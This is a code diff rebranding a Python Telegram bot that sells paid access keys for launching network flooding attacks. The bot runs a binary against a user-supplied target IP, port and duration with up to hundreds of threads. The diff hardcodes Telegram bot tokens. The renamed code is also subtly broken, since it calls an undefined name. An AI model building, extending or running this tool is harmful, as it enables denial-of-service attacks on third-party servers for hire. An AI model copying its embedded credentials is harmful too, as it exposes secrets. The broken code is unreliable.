@@ -26,9 +26,9 @@ KEY_PRICES = {
     'day': 80,   # 80 Rs per day
     'week': 500  # 500 Rs per week
 }
-ADMIN_IDS = [1949883614]
-BOT_TOKEN = "8169032486:AAF3lbIt8hSkNAOp-5zAfNqV2wXQ2ohxKrc"
-thread_count = 50
+ADMIN_IDS = [6906270448]
+BOT_TOKEN = "8063920686:AAHGIr_zTmNn2ZyAl0Q7MRy2t9fnYeqGV6c"
+thread_count = 300
 BINARY_STATE_FILE = 'binary_state.json'
 ADMIN_FILE = 'admin_data.json'
 
@@ -101,10 +101,10 @@ def load_binary_state():
         if os.path.exists(BINARY_STATE_FILE):
             with open(BINARY_STATE_FILE, 'r') as f:
                 state = json.load(f)
-                return state.get('binary', 'Smokie')
-        return 'Smokie'
+                return state.get('binary', 'rare')
+        return 'rare'
     except Exception:
-        return 'Smokie'
+        return 'rare'
 
 def save_binary_state(binary):
     """Save binary state to file with minimal logging"""
@@ -123,8 +123,8 @@ def clear_binary_state():
     except Exception:
         pass
 
-Hmm_Smokie = "QFNtb2tpZU9mZmljaWFs"
-Hmm_Smokiee = "QEhtbV9TbW9raWU="
+rare_leaks = "QFJBUkV4TEVBS1M="
+rare_owner = "QFJBUkV4T1dORVI="
 
 def _d(s):
     return base64.b64decode(s).decode()
@@ -271,8 +271,8 @@ def check_user_expiry():
 def generate_key(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-@bot.message_handler(commands=['setSmokie'])
-def set_Smokie(message):
+@bot.message_handler(commands=['setrare'])
+def set_rare(message):
     global selected_binary
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -286,18 +286,18 @@ def set_Smokie(message):
         clear_binary_state()
         
         # Set and save new state
-        selected_binary = "Smokie"
+        selected_binary = "rare"
         if save_binary_state(selected_binary):
-            bot.send_message(chat_id, "*Binary successfully set to Smokie.*", parse_mode='Markdown')
-            logging.info(f"Admin {user_id} changed binary to Smokie")
+            bot.send_message(chat_id, "*Binary successfully set to rare.*", parse_mode='Markdown')
+            logging.info(f"Admin {user_id} changed binary to rare")
         else:
-            bot.send_message(chat_id, "*Binary set to Smokie but there was an error saving the state.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Binary set to rare but there was an error saving the state.*", parse_mode='Markdown')
     except Exception as e:
-        logging.error(f"Error in set_Smokie: {e}")
+        logging.error(f"Error in set_rare: {e}")
         bot.send_message(chat_id, "*Error occurred while changing binary settings.*", parse_mode='Markdown')
 
-@bot.message_handler(commands=['setSmokie1'])
-def set_Smokie1(message):
+@bot.message_handler(commands=['setrare1'])
+def set_rare1(message):
     global selected_binary
     user_id = message.from_user.id
     chat_id = message.chat.id
@@ -311,14 +311,14 @@ def set_Smokie1(message):
         clear_binary_state()
         
         # Set and save new state
-        selected_binary = "Smokie1"
+        selected_binary = "rare1"
         if save_binary_state(selected_binary):
-            bot.send_message(chat_id, "*Binary successfully set to Smokie1.*", parse_mode='Markdown')
-            logging.info(f"Admin {user_id} changed binary to Smokie1")
+            bot.send_message(chat_id, "*Binary successfully set to rare1.*", parse_mode='Markdown')
+            logging.info(f"Admin {user_id} changed binary to rare1")
         else:
-            bot.send_message(chat_id, "*Binary set to Smokie1 but there was an error saving the state.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Binary set to rare1 but there was an error saving the state.*", parse_mode='Markdown')
     except Exception as e:
-        logging.error(f"Error in set_Smokie1: {e}")
+        logging.error(f"Error in set_rare1: {e}")
         bot.send_message(chat_id, "*Error occurred while changing binary settings.*", parse_mode='Markdown')
 
 # Add a new command to check current binary state
@@ -362,11 +362,11 @@ def set_thread_count(message):
         bot.send_message(chat_id, "*You are not authorized to change thread settings.*", parse_mode='Markdown')
         return
 
-    if selected_binary == "Smokie":
+    if selected_binary == "rare":
         bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_thread_command)
     else:
-        bot.send_message(chat_id, "*Thread setting is only available for Smokie binary. Currently using Smokie1.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Thread setting is only available for rare binary. Currently using rare1.*", parse_mode='Markdown')
 
 def process_thread_command(message):
     global thread_count
@@ -380,7 +380,7 @@ def process_thread_command(message):
             return
 
         thread_count = new_thread_count
-        bot.send_message(chat_id, f"*Thread count set to {thread_count} for Smokie.*", parse_mode='Markdown')
+        bot.send_message(chat_id, f"*Thread count set to {thread_count} for rare.*", parse_mode='Markdown')
 
     except ValueError:
         bot.send_message(chat_id, "*Invalid thread count. Please enter a valid number.*", parse_mode='Markdown')
@@ -392,10 +392,10 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
     
     try:
         # Construct command based on selected binary
-        if selected_binary == "Smokie":
-            command = f"./Smokie {target_ip} {target_port} {duration} {thread_count} "
-        else:  # Smokie1
-            command = f"./Smokie1 {target_ip} {target_port} {duration}"
+        if selected_binary == "rare":
+            command = f"./rare {target_ip} {target_port} {duration} {thread_count} "
+        else:  # rare1
+            command = f"./rare1 {target_ip} {target_port} {duration}"
 
         # Send initial attack message
         bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱!\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
@@ -411,10 +411,10 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         await process.wait()
 
         # Send completion message
-        if selected_binary == "Smokie":
-            bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nUsing: Smokie\nThreads: {thread_count}")
+        if selected_binary == "rare":
+            bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nUsing: rare\nThreads: {thread_count}")
         else:
-            bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nUsing: Smokie1")
+            bot.send_message(chat_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀\nUsing: rare1")
 
     except Exception as e:
         bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
@@ -439,7 +439,7 @@ def attack_command(message):
     found_user = next((user for user in users if user['user_id'] == user_id), None)
 
     if not found_user:
-        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- @Hmm_Smokie*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- @RARExOWNER*", parse_mode='Markdown')
         return
 
     try:
@@ -490,7 +490,7 @@ def process_attack_command(message, chat_id):
 
 @bot.message_handler(commands=['owner'])
 def send_owner_info(message):
-    owner_message = "This Bot Has Been Developed By @Hmm_Smokie"  
+    owner_message = "This Bot Has Been Developed By @RARExOWNER"  
     bot.send_message(message.chat.id, owner_message)
 
 @bot.message_handler(commands=['addadmin'])
@@ -625,7 +625,7 @@ def send_welcome(message):
 
     if is_super_admin(user_id):
         welcome_message = (
-            f"Welcome, Super Admin! To {_d(Hmm_Smokie)}\n\n"
+            f"Welcome, Super Admin! To {_d(RARExOWNER)}\n\n"
             f"Admin Commands:\n"
             f"/addadmin - Add new admin\n"
             f"/removeadmin - Remove admin\n"
@@ -633,14 +633,14 @@ def send_welcome(message):
             f"/remove - Remove user\n"
             f"/users - List all users\n"
             f"/thread - Set thread count\n"
-            f"/setSmokie - Use Smokie (thread) binary\n"
-            f"/setSmokie1 - Use Smokie1 (no thread) binary\n"
+            f"/setrare - Use rare (thread) binary\n"
+            f"/setrare1 - Use rare1 (no thread) binary\n"
             f"/checkbinary - Check binary status\n"
         )
     elif is_admin(user_id):
         balance = get_admin_balance(user_id)
         welcome_message = (
-            f"Welcome, Admin! To {_d(Hmm_Smokie)}\n\n"
+            f"Welcome, Admin! To {_d(RARExOWNER)}\n\n"
             f"Your Balance: {balance}\n\n"
             f"Admin Commands:\n"
             f"/genkey - Generate new key\n"
@@ -649,12 +649,12 @@ def send_welcome(message):
         )
     else:
         welcome_message = (
-            f"Welcome, {username}! To {_d(Hmm_Smokie)}\n\n"
+            f"Welcome, {username}! To {_d(RARExOWNER)}\n\n"
             f"Please redeem a key to access bot functionalities.\n"
             f"Available Commands:\n"
             f"/redeem - To redeem key\n"
             f"/Attack - Start an attack\n\n"
-            f"Contact {_d(Hmm_Smokiee)} for new keys"
+            f"Contact {_d(RARExOWNER)} for new keys"
         )
 
     bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
@@ -665,7 +665,7 @@ def genkey_command(message):
     chat_id = message.chat.id
 
     if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: @Hmm_Smokie*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: @RARExOWNER*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -798,7 +798,7 @@ def remove_user_command(message):
     chat_id = message.chat.id
 
     if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- @Hmm_Smokie*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- @RARExOWNER*", parse_mode='Markdown')
         return
 
     cmd_parts = message.text.split()
@@ -852,12 +852,12 @@ def attack_button_handler(message):
     found_user = next((user for user in users if user['user_id'] == user_id), None)
 
     if not found_user:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @Hmm_Smokie*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @RARExOWNER*", parse_mode='Markdown')
         return
 
     valid_until = datetime.fromisoformat(found_user['valid_until'])
     if datetime.now() > valid_until:
-        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @Hmm_Smokie.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @RARExOWNER.*", parse_mode='Markdown')
         return
 
     try:
@@ -909,7 +909,7 @@ def my_account(message):
         if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
             account_info = (
                 "𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐧𝐞𝐰 𝐤𝐞𝐲.\n"
-                "Contact @Hmm_Smokie for assistance."
+                "Contact @RARExOWNER for assistance."
             )
         else:
             account_info = (
@@ -920,7 +920,7 @@ def my_account(message):
                 f"ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: {current_time}"
             )
     else:
-        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @Hmm_Smokie."
+        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @RARExOWNER."
 
     bot.send_message(message.chat.id, account_info)
 
